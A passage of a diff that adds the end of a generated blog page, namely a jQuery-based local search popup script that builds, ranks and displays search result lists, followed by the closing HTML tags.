+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
